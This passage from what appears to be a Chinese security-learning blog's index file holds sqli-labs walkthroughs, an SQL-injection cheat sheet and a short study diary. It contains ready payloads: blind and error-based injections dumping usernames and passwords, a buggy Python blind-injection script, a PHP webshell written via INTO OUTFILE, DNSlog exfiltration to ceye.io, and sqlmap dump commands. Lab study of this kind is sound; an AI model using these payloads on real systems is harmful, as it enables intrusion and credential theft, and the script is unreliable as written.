group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;))&gt;20--+</span><br><span class="line">依次爆列名:</span><br><span class="line">?id=1&#x27;)) and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),1,1))&gt;99--+</span><br><span class="line">判断数据内容长度: </span><br><span class="line">?id=1&#x27;)) and length((select group_concat(username,password) from users))&gt;109--+</span><br><span class="line">依次爆数据内容</span><br><span class="line">?id=1&#x27;)) and ascii(substr((select group_concat(username,password) from users),1,1))&gt;50--+</span><br></pre></td></tr></table></figure><p>exp(python脚本):</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line">url = <span class="built_in">input</span>(<span class="string">&quot;请输入url：&quot;</span>)</span><br><span class="line">payloads = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz1234567890&#x27;</span><span class="comment">#mysql字母不区分大小写，所以不用加入大写字母，还有各种符号，可以自由添加</span></span><br><span class="line">headers = &#123;<span class="string">&#x27;cookie&#x27;</span>:<span class="string">&#x27;&#x27;</span>&#125;<span class="comment">#需要登陆的可以在这里加入cookies</span></span><br><span class="line"><span class="comment">#爆破数据库的长度</span></span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):<span class="comment">#这里用来爆破库的长度，非必须，可以将爆破库名时的循环设置的长一点，大于正常库名长度</span></span><br><span class="line">     databaseLen_payload = <span class="string">&#x27;?id=1\&#x27; and length(database())= &#x27;</span>+<span class="built_in">str</span>(l) + <span class="string">&#x27; %23&amp;Submit=Submit#&#x27;</span><span class="comment">#将#和\号使用url编码，在#号后将完整的url拼接起来</span></span><br><span class="line">     <span class="keyword">if</span>  <span class="string">&#x27;&#x27;</span> <span class="keyword">in</span> s.get(url+databaseLen_payload,headers=headers).text:<span class="comment"># 这里面写入判断布尔型存在的根据</span></span><br><span class="line">         databaseLen =l</span><br><span class="line">         <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;database_lenth: &#x27;</span>+<span class="built_in">str</span>(databaseLen))</span><br><span class="line"></span><br><span class="line"><span class="comment">#爆破数据库的名</span></span><br><span class="line">database_name = <span class="string">&#x27;&#x27;</span><span class="comment">#</span></span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,databaseLen+<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> payloads:</span><br><span class="line">        database_payload = <span class="string">&#x27;?id=1\&#x27; and substr(database(),&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;\&#x27; %23&amp;Submit=Submit#&#x27;</span><span class="comment">#拼接完整的url</span></span><br><span class="line">        <span class="keyword">if</span>  <span class="string">&#x27;&#x27;</span> <span class="keyword">in</span> s.get(url+database_payload, headers=headers).text:</span><br><span class="line">            database_name += i</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;database_name:&#x27;</span>+database_name)</span><br><span class="line"></span><br><span class="line"><span class="comment">#爆破表的个数</span></span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    tableNum_payload = <span class="string">&#x27;?id=1\&#x27;and(select count(table_name) from information_schema.tables where table_schema=database())=&#x27;</span>+<span class="built_in">str</span>(j)+<span class="string">&#x27; %23&amp;Submit=Submit#&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">in</span> s.get(url+tableNum_payload,headers=headers).text:</span><br><span class="line">        tableNum =l</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;tableNum:&#x27;</span>+<span class="built_in">str</span>(tableNum))</span><br><span class="line"></span><br><span class="line"><span class="comment">#爆出所有的表名</span></span><br><span class="line"><span class="comment">#先爆出表名的长度</span></span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,tableNum):</span><br><span class="line">    table_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">        tableLen_payload = <span class="string">&#x27;?id=1\&#x27; and length(substr((select table_name form information_schema.tables where tale_schema=database() limit &#x27;</span> +<span class="built_in">str</span>(l) +<span class="string">&#x27;,1),1))=&#x27;</span> +<span class="built_in">str</span>(i) +<span class="string">&#x27; %23&amp;Submit = Submit#&#x27;</span></span><br><span class="line">               <span class="comment"># 用法substr(&#x27;This is a test&#x27;, 6) 返回&#x27;is a test&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">in</span> s.get(url+tableLen_payload, headers=headers).text:</span><br><span class="line">            tableLen = i</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;table&#x27;</span>+<span class="built_in">str</span>(j+<span class="number">1</span>)+<span class="string">&#x27;_length: &#x27;</span>+<span class="built_in">str</span>(tableLen))</span><br><span class="line">            <span class="comment"># (2)内部循环爆破每个表的表名</span></span><br><span class="line">            <span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,tableLen+<span class="number">1</span>):</span><br><span class="line">                <span class="keyword">for</span> n <span class="keyword">in</span> payloads: <span class="comment"># i在上个循环用过了</span></span><br><span class="line">                    table_payload = <span class="string">&#x27;?id=1\&#x27; and substr((select table_name from information_schema.tables where table_schema=database() limit &#x27;</span>+<span class="built_in">str</span>(j)+<span class="string">&#x27;,1),&#x27;</span>+<span class="built_in">str</span>(m)+<span class="string">&#x27;,1)=\&#x27;&#x27;</span>+<span class="built_in">str</span>(n)+<span class="string">&#x27;\&#x27; %23&amp;Submit=Submit#&#x27;</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="string">&#x27;User ID exists in the database.&#x27;</span> <span class="keyword">in</span> s.get(url+table_payload, headers=headers).text:</span><br><span class="line">                        table_name += n</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;table&#x27;</span>+<span class="built_in">str</span>(j+<span class="number">1</span>)+<span class="string">&#x27;_name: &#x27;</span>+table_name)</span><br><span class="line"></span><br><span class="line"><span class="comment">#根据上个脚本获得的结果，来跑对应表中的字段</span></span><br><span class="line"></span><br><span class="line">s =requests.session()  <span class="comment">#保持会话</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#判断表中的字段数目</span></span><br><span class="line">columnNum = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    columnNum_payload = <span class="string">&#x27;?id=1\&#x27; and(select count(column_name)from information_schema.columns where table_name = \ &#x27;</span><span class="string">&#x27;) = &#x27;</span><span class="built_in">str</span>(l)+<span class="string">&#x27;%23&amp;Submit = Submit&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">in</span> s.get(url+columnNum_payload,headers=headers).text:</span><br><span class="line">        columnNum = l</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;columnNum:&#x27;</span>+<span class="built_in">str</span>(columnNum))</span><br><span class="line"></span><br><span class="line"><span class="comment">#爆出每个字段的长度</span></span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span>  <span class="built_in">range</span>(<span class="number">0</span>,columnNum):</span><br><span class="line">    column_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">        columnLen_payload = <span class="string">&#x27;?id=1\&#x27; and length(substr((select column_name from information_schema.columns where table_name=\&#x27;flagishere\&#x27; limit &#x27;</span> + <span class="built_in">str</span>(</span><br><span class="line">            j) + <span class="string">&#x27;,1),1))=&#x27;</span> + <span class="built_in">str</span>(i) + <span class="string">&#x27; %23&amp;Submit=Submit#&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;User ID exists in the database.&#x27;</span> <span class="keyword">in</span> s.get(url + columnLen_payload, headers=headers).text:</span><br><span class="line">            columnLen = i</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;column&#x27;</span> + <span class="built_in">str</span>(j + <span class="number">1</span>) + <span class="string">&#x27;_length: &#x27;</span> + <span class="built_in">str</span>(columnLen))</span><br><span class="line"></span><br><span class="line">            <span class="comment"># (2)内部循环爆破每个表的表名</span></span><br><span class="line">            <span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, columnLen + <span class="number">1</span>):</span><br><span class="line">                <span class="keyword">for</span> n <span class="keyword">in</span> payloads:  <span class="comment"># i在上个循环用过了</span></span><br><span class="line">                    column_payload = <span class="string">&#x27;?id=1\&#x27; and substr((select column_name from information_schema.columns where table_name=\&#x27;flagishere\&#x27; limit &#x27;</span> + <span class="built_in">str</span>(</span><br><span class="line">                        j) + <span class="string">&#x27;,1),&#x27;</span> + <span class="built_in">str</span>(m) + <span class="string">&#x27;,1)=\&#x27;&#x27;</span> + <span class="built_in">str</span>(n) + <span class="string">&#x27;\&#x27; %23&amp;Submit=Submit#&#x27;</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="string">&#x27;User ID exists in the database.&#x27;</span> <span class="keyword">in</span> s.get(url + column_payload, headers=headers).text:</span><br><span class="line">                        column_name += n</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;column&#x27;</span> + <span class="built_in">str</span>(j + <span class="number">1</span>) + <span class="string">&#x27;_name: &#x27;</span> + column_name)</span><br></pre></td></tr></table></figure><h3 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h3><p><code>&#39;</code>闭合,布尔盲注</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">判断库名长度:</span><br><span class="line">?id=1&#x27; and length((select database()))&gt;9--+</span><br><span class="line">依次爆库名:</span><br><span class="line">?id=1&#x27; and ascii(substr((select database()),1,1))=115--+。</span><br><span class="line">判断表名长度:  </span><br><span class="line">?id=1&#x27; and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))&gt;13--+</span><br><span class="line">依次爆表名:</span><br><span class="line">?id=1&#x27; and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))&gt;99--+</span><br><span class="line">判断列名长度:</span><br><span class="line">?id=1&#x27; and length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;))&gt;20--+</span><br><span class="line">依次爆列名:</span><br><span class="line">?id=1&#x27; and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),1,1))&gt;99--+</span><br><span class="line">判断数据内容长度: </span><br><span class="line">?id=1&#x27; and length((select group_concat(username,password) from users))&gt;109--+</span><br><span class="line">依次爆数据内容:</span><br><span class="line">?id=1&#x27; and ascii(substr((select group_concat(username,password) from users),1,1))&gt;50--+</span><br></pre></td></tr></table></figure><h3 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h3><p><code>&#39;</code>闭合,时间盲注</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">判断库名长度:</span><br><span class="line">?id=1&#x27; and if(length((select database()))&gt;9,sleep(5),1)--+</span><br><span class="line">依次爆库名:</span><br><span class="line">?id=1&#x27; and if(ascii(substr((select database()),1,1))=115,sleep(5),1)--+</span><br><span class="line">判断表名长度:</span><br><span class="line">?id=1&#x27; and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))&gt;13,sleep(5),1)--+</span><br><span class="line">依次爆表名:</span><br><span class="line">?id=1&#x27; and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))&gt;99,sleep(5),1)--+</span><br><span class="line">判断列名长度:</span><br><span class="line">?id=1&#x27; and if(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;))&gt;20,sleep(5),1)--+</span><br><span class="line">依次爆列名:</span><br><span class="line">?id=1&#x27; and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),1,1))&gt;99,sleep(5),1)--+</span><br><span class="line">判断数据内容长度: </span><br><span class="line">?id=1&#x27; and if(length((select group_concat(username,password) from users))&gt;109,sleep(5),1)--+ </span><br><span class="line">依次爆数据内容:</span><br><span class="line">?id=1&#x27; and if(ascii(substr((select group_concat(username,password) from users),1,1))&gt;50,sleep(5),1)--+</span><br></pre></td></tr></table></figure><h3 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h3><p><code>&#39;&#39;</code>闭合,时间盲注(方法同上)</p><h3 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h3><p>POST型注入,<code>&#39;</code>闭合(需用<code>#</code>注释)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; or 1=1 #判断是否存在sql注入。</span><br><span class="line">1&#x27; union select 1,2#</span><br></pre></td></tr></table></figure><p>接下来正常union联合注入</p><h3 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h3><p>POST型注入,<code>&quot;)</code>闭合</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&quot; ) or 1=1 #判断是否存在sql注入。</span><br><span class="line">1&quot; ) union select 1,2#</span><br></pre></td></tr></table></figure><p>接下来正常union联合注入</p><h3 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h3><p>POST型注入,<code>&#39;</code>闭合</p><p>接下来正常union联合注入</p><h3 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h3><p>POST型注入,<code>&quot;</code>闭合</p><p>接下来正常union联合注入</p><h3 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h3><p>POST型注入,<code>&#39;</code>闭合,无回显</p><p>接下来正常布尔盲注</p><h3 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h3><p>POST型注入,<code>&quot;)</code>闭合,无回显</p><p>接下来正常布尔盲注</p><h3 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h3><p>POST型报错注入,<code>&#39;</code>闭合</p><p>经测试在密码框注入</p><p><code>uname=admin&amp;passwd=6666&#39; or updatexml(1,concat(0x7e,(version()),0x7e),0) or &#39;&amp;submit=Submit</code></p><h3 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h3><p>请求头(UA)报错注入,<code>&#39;</code>闭合</p><h3 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h3><p>请求头(Referer)报错注入,<code>&#39;</code>闭合</p><h3 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h3><p>请求头(Cookie)报错注入,<code>&#39;</code>闭合</p><p><code>Cookie: uname=&#39; union select 1,database(),3 or 1=1 #;</code></p>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全-SQL注入</title>
      <link href="/2024/01/23/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-web%E5%AE%89%E5%85%A8-sql%E6%B3%A8%E5%85%A5/"/>
      <url>/2024/01/23/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-web%E5%AE%89%E5%85%A8-sql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="注入流程"><a href="#注入流程" class="headerlink" title="注入流程"></a>注入流程</h2><p>1.判断注入点(url,输入框,请求头中等与数据库交互的地方)</p><p>2.判断是字符型还是数字型(注入and 1&#x3D;1 1&#x3D;2 或者 3-1类似方式)</p><p>3.若是字符型,找到闭合方式,类似:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">or 1=1 --+</span><br><span class="line">’ or 1=1 --+</span><br><span class="line">&quot; or 1=1 --+</span><br><span class="line">) or 1=1 --+</span><br><span class="line">‘) or 1=1 --+</span><br><span class="line">‘)) or 1=1 --+</span><br><span class="line">&quot;) or 1=1 --+</span><br><span class="line">&quot;)) or 1=1 --+</span><br></pre></td></tr></table></figure><p>4.判断查询列数长短(group by 或者 order by)</p><p><strong>注</strong>:</p><ul><li><p>若有回显,查询回显位(查询-1)后可以利用union联合注入</p></li><li><p>若无回显(有报错回显),可以选择盲注(布尔盲注和时间盲注)或报错注入,若其中页面对注入的真假无反应,则无法使用布尔盲注</p></li><li><p>若无回显(无报错回显),同上但不能使用报错注入</p></li></ul><h2 id="union联合注入"><a href="#union联合注入" class="headerlink" title="union联合注入"></a>union联合注入</h2><p>1.判断回显位<code>union select 1,2,3,...,n</code></p><p>2.依次在回显位查库,表,列名:</p><ul><li><p>查库:<code>database()</code></p></li><li><p>查表:<code>select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;</code></p></li><li><p>查列:<code>select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;emails&#39;</code></p></li><li><p>查数据:<code>select email_id from emails limit 0, 1</code><br><code>select email_id from emails limit 1, 1</code><br><code>select email_id from emails limit 2, 1</code><br>…….</p></li></ul><h2 id="常用的报错注入"><a href="#常用的报错注入" class="headerlink" title="常用的报错注入"></a>常用的报错注入</h2><p>以下函数内的数字用来占位(无实际意义,可以输入其他字符)</p><h3 id="extractvalue报错"><a href="#extractvalue报错" class="headerlink" title="extractvalue报错"></a>extractvalue报错</h3><ul><li><p>查库:<code>and(这里也可以利用union select,以下同理) extractvalue(1, concat(0x7e(**波浪号的ASCII值**),(select database()))) --+</code></p></li><li><p>查表:<code>and extractvalue(1, concat(&#39;~&#39;,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;)))--+</code></p></li><li><p>查列:<code>and extractvalue(1, concat(&#39;~&#39;,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;emails&#39;)))--+</code></p></li><li><p>查数据:<code>and extractvalue(1, concat(&#39;~&#39;,(select email_id from emails limit 0,1)))--+</code></p></li></ul><h3 id="updatexml报错"><a href="#updatexml报错" class="headerlink" title="updatexml报错"></a>updatexml报错</h3><p>和上一个函数同理,如查表:<code>and updatexml(1, concat(&#39;~&#39;,database()), 3)--+</code></p><h3 id="floor报错"><a href="#floor报错" class="headerlink" title="floor报错"></a>floor报错</h3><p>payload(查表):<code>select count(*),2,concat(&#39;:&#39;,(select database()),&#39;:&#39;,floor(rand()*2))as a from information_schema.tables group by a</code></p><p>查其他数据修改相应位置即可</p><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>利用:<code>length(database())</code>和数字比较观察页面的真假值爆库名长度</p><p>如:<code>length(database())&gt;=8</code>页面返回真,而<code>length(database())&gt;=9</code>页面返回假,则库名长度为8</p><p>再利用:<code>ascii(substr((database()),1,1))</code>相应的和各个字母的ascii码值比较,重复多次,观察页面的真假值爆库名</p><p>如:<code>ascii(substr((database()),1,1))=97</code>页面返回真,则库名第一个字母为ascii码值为97的字母(a)</p><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>利用<code>if(condition,sleep(0),sleep(3))</code>,其中从condition为布尔盲注的几个步骤</p><p>函数通过判断<strong>condition</strong>部分的真假来返回sleep(0)或sleep(3),而后我们观察页面响应时间来判断语句真假爆出数据</p><h2 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h2><ul><li><p>若多字段：select `x` from(select 1,2,3,4,xxx from table_name union select * from table_name)</p></li><li><p>若单字段：<code>select *,1,2,xxx from table_name</code></p></li></ul><h2 id="sql注入写文件"><a href="#sql注入写文件" class="headerlink" title="sql注入写文件"></a>sql注入写文件</h2><p>写入shell的几种方式: <a href="https://blog.csdn.net/xhy18634297976/article/details/119486812">https://blog.csdn.net/xhy18634297976/article/details/119486812</a></p><p>向目标网站后台写入1.php的webshell:</p><p><code>select 1,&quot;&lt;?php @assert($_POST[&#39;t&#39;]);?&gt;&quot; into outfile &#39;/var/www/html/1.php&#39;;</code></p><p><strong>注</strong>:</p><ul><li><p>secure-file-priv无值或为可利用的目录</p></li><li><p>需知道目标目录的绝对目录地址</p></li><li><p>目标目录可写，mysql的权限足够。</p></li></ul><h2 id="DNSlog注入"><a href="#DNSlog注入" class="headerlink" title="DNSlog注入"></a>DNSlog注入</h2><p>同上需要读写权限,且服务器需要架设在windows系统上</p><p>payload:<code>load_file(concat(&#39;\\&#39;,(condition),&#39;.xxxx.ceye.io\xxxx.txt&#39;))</code>,其中修改<strong>condition</strong>部分做到查库,表,列名</p><p>如:注入<code>load_file(concat(&#39;\\&#39;,(select database()),&#39;.xxxx.ceye.io\xxxx&#39;))</code>后,到<a href="http://www.ceye.io/">http://www.ceye.io</a>查看域名解析结果,就能显示出库名</p><p>也可以选择用<a href="http://www.dnslog.cn/">http://www.dnslog.cn</a>获取域名作为payload最后一部分的域名内容,解析后获得结果</p><p><strong>注</strong>: 若失败,可以尝试转义”\\“符号,写入四个反斜杠</p><h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><p>条件: 用户向数据库插入恶意语句（即:使后端代码对语句进行了转义，如mysql_escape_string、mysql_real_escape_string转义）</p><p>详解: <a href="https://blog.csdn.net/hhhhhhhhh85/article/details/121328475">https://blog.csdn.net/hhhhhhhhh85/article/details/121328475</a></p><p>利用: 在有转义处写入恶意代码(如在注册处)<code>admin’#</code>存入了数据库,但因转义不会形成sql注入</p><p>&emsp;&emsp;之后登录时若平台直接从数据库拿出此数据(不进行转义),那么就会形成sql注入</p><p>&emsp;&emsp;例如:拿出数据后形成这样的命令<code>“UPDATE users SET PASSWORD=‘123456’ where username=‘admin’#’ and password=’$curr_pass’”</code>,那么就会以账户为admin登录成功</p><h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p>将语句堆叠在一起进行查询的利用方式,因为<code>mysql_multi_query()</code>支持多条sql语句同时执行,以<code>;</code>作为分隔符</p><p>例如:<code>select * from users;show databases;</code> 同时执行了两条语句</p><h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>条件: 将用户输入转义并进行GBK编码的平台</p><p>闭合式需要注入:<code>%df&#39;--+</code>,之后查数据操作不变</p><p>原理: 后台将单引号(‘)转义成斜杠单引号(\‘),则payload变为<code>%df\&#39;--+</code>,但<code>%df\</code>进行GBK编码后会变为中文字符,导致数据库无法识别,那么单引号就被保留下来成功拥有闭合作用了</p><h2 id="SqlMap"><a href="#SqlMap" class="headerlink" title="SqlMap"></a>SqlMap</h2><p>1.判断是否存在注入</p><p>目标注入点为<code>http://xxx.com/index.php?id=1</code>这种传入参数的命令为<code>sqlmap -u http://xxx.com/index.php?id=1</code> 便可以自动进行检测，另外如果传入的参数有大于等于两个时，需要将URL使用双引号括起来。</p><p>除了直接检测URL外，sqlmap还可以从文本中获取HTTP请求，所以我们可以用burpsuit将HTTP请求抓包，然后保存到本地为TXT文件，然后使用sqlmap来进行测试，具体命令为<code>sqlmap -r 文件路径和文件名</code>，</p><p>这种一般用来检测post注入和HTTP头注入。</p><p>2.查询当前用户下的所有数据库</p><p><code>sqlmap -u http://xxx.com/index.php?id=1 --dbs</code></p><p>3.获取数据库的表名</p><p><code>sqlmap -u http://xxx.com/index.php?id=1 -D 数据库名 --tables</code></p><p>这个命令可以查询指定数据库中的所有表名。</p><p>4.获取表中的字段名</p><p><code>sqlmap.py -u http://xxx.com/index.php?id=1 -D 数据库名 -T 表名 --columns</code></p><p>5.获取字段的内容</p><p><code>sqlmap -u http://xxx.com/index.php?id=1 -D 数据库名 -T 表名 -C 字段名 --dump</code></p><p>6.获取数据库的所有用户和用户的密码</p><p><code>sqlmap -u http://xxx.com/index.php?id=1” --users</code></p><p><code>sqlmap -u http://xxx.com/index.php?id=1” --passwords</code></p><h2 id="一些bypass与绕waf"><a href="#一些bypass与绕waf" class="headerlink" title="一些bypass与绕waf"></a>一些bypass与绕waf</h2><p>参考:<a href="https://wooyun.js.org/drops/MySQL%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7.html">https://wooyun.js.org/drops/MySQL%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>新周记1</title>
      <link href="/2024/01/21/%E5%91%A8%E8%AE%B0-2024-01-21-%E6%96%B0%E5%91%A8%E8%AE%B01/"/>
      <url>/2024/01/21/%E5%91%A8%E8%AE%B0-2024-01-21-%E6%96%B0%E5%91%A8%E8%AE%B01/</url>
      
        <content type="html"><![CDATA[<h2 id="周记1"><a href="#周记1" class="headerlink" title="周记1"></a>周记1</h2><p>到了寒假了,对于基础漏洞也大概学过来一遍了,所以给自己开了个新坑</p><p>打算把之前学过的和之后遇见的关于漏洞打法和绕过的精华和重点部分做一个记录(持续更新)</p><p>作为知识总结方便之后的查阅或者复习,也作为一遍复习或是差缺补漏,因为确实了解到我的知识体系漏洞百出</p><p>这次总结的部分链接放在下面:</p><p><a href="https://hades-blog.github.io/2024/01/19/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-web%E5%AE%89%E5%85%A8-RCE/">https://Hades-blog.github.io/2024/01/19/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-web%E5%AE%89%E5%85%A8-RCE/</a></p><hr><p>那么在之后,我打算继续往下学习,比如内网渗透的部分</p><p>并且增进实操能力,多增加点解题思路和上手实践,没事做做ctf或是看看wp,因为这一部分确实引发了一些我的思考</p><p>现在确实发现了学习部分和实操方面差距很大,光听懂了但一到实战就懵逼了哈哈</p><p>果然不论是开始的web安全还是之后的渗透测试都是实践至上,多操作,多去复盘..接下来,坚持下去才是真理啊</p>]]></content>
      
      
      <categories>
          
          <category> 周记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 周记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全-RCE(远程代码执行/命令执行)</title>
